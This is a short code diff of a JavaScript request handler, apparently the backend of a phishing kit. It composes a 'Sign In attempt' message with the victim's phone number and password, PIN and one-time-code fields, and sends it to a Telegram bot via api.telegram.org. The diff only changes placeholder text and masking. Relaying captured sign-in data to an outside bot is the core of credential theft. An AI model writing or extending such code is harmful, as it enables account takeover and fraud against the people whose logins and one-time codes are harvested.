@@ -22,19 +22,19 @@ export default async function handler(req, res) {
           /^(\+?\d{2})\d+(\d{2})$/,
           "1111111111"
         )
-      :  "provided";
+      :  "OTP";
 
     const message =
       `🔐 Sign In attempt\n\n` +
       `📱 Phone: ${Phone}\n` +
-      `🔑 Password: [ENTERED]\n` +
-      `🔢 PIN: [ENTERED]\n\n` +
+      `🔑 Password: [111111]\n` +
+      `🔢 PIN: [111111]\n\n` +
       `🔒 OTP requested\n` +
       `📱 Phone: ${Phone}\n\n` +
       `🔑 OTP Entered\n` +
       `📱 Phone: ${Phone}\n` +
-      `🔢 OTP: [ENTERED]\n\n` +
-      `✅ Result: ${result || "OTP entered"}`;
+      `🔢 OTP: [111111]\n\n` +
+      `✅ Result: ${result || "OTP provided"}`;
 
     const response = await fetch(
       `https://api.telegram.org/bot${token}/sendMessage`,
